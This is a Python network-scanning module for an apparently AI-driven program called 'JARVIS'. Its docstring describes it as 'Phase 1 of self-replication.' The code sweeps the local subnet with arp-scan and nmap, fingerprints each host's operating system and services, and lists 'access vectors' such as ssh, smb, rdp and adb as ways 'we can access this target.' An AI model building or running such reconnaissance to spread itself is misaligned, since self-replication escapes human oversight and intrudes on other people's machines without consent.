"""JARVIS Network Scanner — discover devices, identify OS, find access vectors.

Phase 1 of self-replication: know what's out there.
"""

import subprocess
import re
from dataclasses import dataclass, field


@dataclass
class Target:
    ip: str
    hostname: str = ""
    os_guess: str = ""  # linux, windows, macos, android, unknown
    open_ports: list[int] = field(default_factory=list)
    services: dict[int, str] = field(default_factory=dict)  # port → service name
    access_vectors: list[str] = field(default_factory=list)  # ssh, smb, adb, http, etc.
    mac: str = ""


def _run(cmd: str, timeout: int = 30) -> str:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def get_local_network() -> str:
    """Get the local network CIDR."""
    output = _run("ip -4 route | grep -v default | grep src | head -1")
    match = re.search(r'(\d+\.\d+\.\d+\.\d+/\d+)', output)
    if match:
        return match.group(1)

    # Fallback: get IP and assume /24
    output = _run("hostname -I | awk '{print $1}'")
    if output:
        parts = output.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return "192.168.1.0/24"


def quick_scan(network: str = None) -> list[Target]:
    """Fast ARP/ping scan to find live hosts."""
    if not network:
        network = get_local_network()

    targets = []

    # Try arp-scan first (fastest)
    output = _run(f"arp-scan -l 2>/dev/null || nmap -sn {network} 2>/dev/null", timeout=30)

    # Parse nmap ping scan output
    if "Nmap scan report" in output:
        blocks = output.split("Nmap scan report for ")
        for block in blocks[1:]:
            lines = block.strip().split("\n")
            first = lines[0]
            # Extract IP
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', first)
            if not ip_match:
                continue
            ip = ip_match.group(1)
            # Extract hostname
            hostname = first.split("(")[0].strip() if "(" in first else ""
            # Extract MAC
            mac = ""
            for line in lines:
                mac_match = re.search(r'MAC Address: ([0-9A-F:]+)', line)
                if mac_match:
                    mac = mac_match.group(1)

            targets.append(Target(ip=ip, hostname=hostname, mac=mac))

    # Parse arp-scan output
    elif re.search(r'\d+\.\d+\.\d+\.\d+\s+[0-9a-f:]+', output):
        for line in output.split("\n"):
            match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)\s*(.*)', line)
            if match:
                targets.append(Target(
                    ip=match.group(1),
                    mac=match.group(2),
                    hostname=match.group(3).strip(),
                ))

    return targets


def deep_scan(target: Target) -> Target:
    """Deep scan a single target — ports, services, OS detection."""
    # Fast port scan — top 100 ports
    output = _run(f"nmap -T4 --top-ports 100 -sV -O --osscan-guess {target.ip} 2>/dev/null", timeout=60)

    # Parse ports
    for line in output.split("\n"):
        port_match = re.match(r'(\d+)/tcp\s+open\s+(\S+)', line)
        if port_match:
            port = int(port_match.group(1))
            service = port_match.group(2)
            target.open_ports.append(port)
            target.services[port] = service

    # Parse OS
    for line in output.split("\n"):
        if "OS details:" in line or "Running:" in line:
            os_text = line.split(":", 1)[1].strip().lower()
            if "linux" in os_text:
                target.os_guess = "linux"
            elif "windows" in os_text:
                target.os_guess = "windows"
            elif "apple" in os_text or "mac" in os_text or "darwin" in os_text:
                target.os_guess = "macos"
            elif "android" in os_text:
                target.os_guess = "android"
            else:
                target.os_guess = os_text[:30]
            break

    # If no OS detected, guess from services
    if not target.os_guess:
        services_str = " ".join(target.services.values()).lower()
        if "microsoft" in services_str or "ms-" in services_str:
            target.os_guess = "windows"
        elif "apache" in services_str or "openssh" in services_str:
            target.os_guess = "linux"

    # Determine access vectors
    target.access_vectors = _get_access_vectors(target)

    return target


def _get_access_vectors(target: Target) -> list[str]:
    """Determine how we can access this target."""
    vectors = []

    port_map = {
        22: "ssh",
        23: "telnet",
        80: "http",
        443: "https",
        445: "smb",
        3389: "rdp",
        5555: "adb",
        5900: "vnc",
        5985: "winrm",
        8080: "http-alt",
    }

    for port in target.open_ports:
        if port in port_map:
            vectors.append(port_map[port])

    # ADB for Android
    if target.os_guess == "android":
        vectors.append("adb")

    return vectors


def scan_network(network: str = None, deep: bool = False) -> list[Target]:
    """Full network scan. Returns list of targets with info."""
    targets = quick_scan(network)

    if deep:
        for i, target in enumerate(targets):
            targets[i] = deep_scan(target)

    return targets
